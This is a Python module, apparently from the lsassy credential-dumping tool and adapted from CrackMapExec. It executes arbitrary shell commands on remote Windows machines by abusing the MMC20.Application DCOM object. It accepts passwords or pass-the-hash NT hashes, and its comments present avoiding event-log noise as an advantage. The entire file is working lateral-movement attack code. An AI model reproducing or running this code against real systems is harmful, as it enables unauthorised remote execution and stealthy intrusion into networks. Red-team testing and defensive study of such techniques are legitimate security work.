#!/usr/bin/python
# Class copied and adapted from CrackMapExec project:
# https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb/mmcexec.py
#
# Copyright (c) 2003-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# A similar approach to wmiexec but executing commands through MMC.
# Main advantage here is it runs under the user (has to be Admin) 
# account, not SYSTEM, plus, it doesn't generate noisy messages
# in the event log that smbexec.py does when creating a service.
# Drawback is it needs DCOM, hence, I have to be able to access 
# DCOM ports at the target machine.
#
# Original discovery by Matt Nelson (@enigma0x3):
# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
#
# Author:
#  beto (@agsolino)
#
# Reference for:
#  DCOM
#
# ToDo:
# [ ] Kerberos auth not working, invalid_checksum is thrown. Most probably sequence numbers out of sync due to
#     getInterface() method
#

import logging

from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
    VARIANT, VARENUM, DISPATCH_METHOD
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcomrt import OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
    OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
    IRemUnknown2, INTERFACE
from impacket.dcerpc.v5.dtypes import NULL

from lsassy.exec import IExec


class Exec(IExec):
    """
    Remote execution using MMC as provided user

    This execution method does not provide debug privilege
    """
    debug_privilege = True
    kerberos_support = False

    def __init__(self, session):
        super().__init__(session)
        self.__shell = 'c:\\windows\\system32\\cmd.exe'
        self.__pwd = 'C:\\'

        self.__quit = None
        self.__executeShellCommand = None

    def getInterface(self, interface, resp):
        # Now let's parse the answer and build an Interface instance
        objRefType = OBJREF(b''.join(resp))['flags']
        objRef = None
        if objRefType == FLAGS_OBJREF_CUSTOM:
            objRef = OBJREF_CUSTOM(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_HANDLER:
            objRef = OBJREF_HANDLER(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_STANDARD:
            objRef = OBJREF_STANDARD(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_EXTENDED:
            objRef = OBJREF_EXTENDED(b''.join(resp))
        else:
            logging.error("Unknown OBJREF Type! 0x%x" % objRefType)

        return IRemUnknown2(
            INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'],
                      oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
                      target=interface.get_target()))

    def clean(self):
        dispParams = DISPPARAMS(None, False)
        dispParams['rgvarg'] = NULL
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 0
        dispParams['cNamedArgs'] = 0
        try:
            self.__quit[0].Invoke(self.__quit[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
        except Exception as e:
            pass

        try:
            self.dcom.disconnect()
        except Exception as e:
            pass

    def exec(self, command):
        if not super().exec(command):
            return False

        self.dcom = DCOMConnection(
            self.session.address,
            self.session.username,
            self.session.password,
            self.session.domain,
            self.session.lmhash,
            self.session.nthash,
            self.session.aesKey,
            oxidResolver=True,
            doKerberos=self.session.kerberos,
            kdcHost=self.session.dc_ip
        )

        try:
            iInterface = self.dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'),
                                                      IID_IDispatch)
            iMMC = IDispatch(iInterface)

            resp = iMMC.GetIDsOfNames(('Document',))

            dispParams = DISPPARAMS(None, False)
            dispParams['rgvarg'] = NULL
            dispParams['rgdispidNamedArgs'] = NULL
            dispParams['cArgs'] = 0
            dispParams['cNamedArgs'] = 0
            resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])

            iDocument = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
            resp = iDocument.GetIDsOfNames(('ActiveView',))
            resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])

            iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
            pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]

            pQuit = iMMC.GetIDsOfNames(('Quit',))[0]

            self.__quit = (iMMC, pQuit)
            self.__executeShellCommand = (iActiveView, pExecuteShellCommand)

        except Exception as e:
            logging.debug("Error : {}".format(e), exc_info=True)
            self.clean()

        dispParams = DISPPARAMS(None, False)
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 4
        dispParams['cNamedArgs'] = 0
        arg0 = VARIANT(None, False)
        arg0['clSize'] = 5
        arg0['vt'] = VARENUM.VT_BSTR
        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg0['_varUnion']['bstrVal']['asData'] = self.__shell

        arg1 = VARIANT(None, False)
        arg1['clSize'] = 5
        arg1['vt'] = VARENUM.VT_BSTR
        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg1['_varUnion']['bstrVal']['asData'] = self.__pwd

        arg2 = VARIANT(None, False)
        arg2['clSize'] = 5
        arg2['vt'] = VARENUM.VT_BSTR
        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg2['_varUnion']['bstrVal']['asData'] = command

        arg3 = VARIANT(None, False)
        arg3['clSize'] = 5
        arg3['vt'] = VARENUM.VT_BSTR
        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg3['_varUnion']['bstrVal']['asData'] = '7'
        dispParams['rgvarg'].append(arg3)
        dispParams['rgvarg'].append(arg2)
        dispParams['rgvarg'].append(arg1)
        dispParams['rgvarg'].append(arg0)
        self.__executeShellCommand[0].Invoke(self.__executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
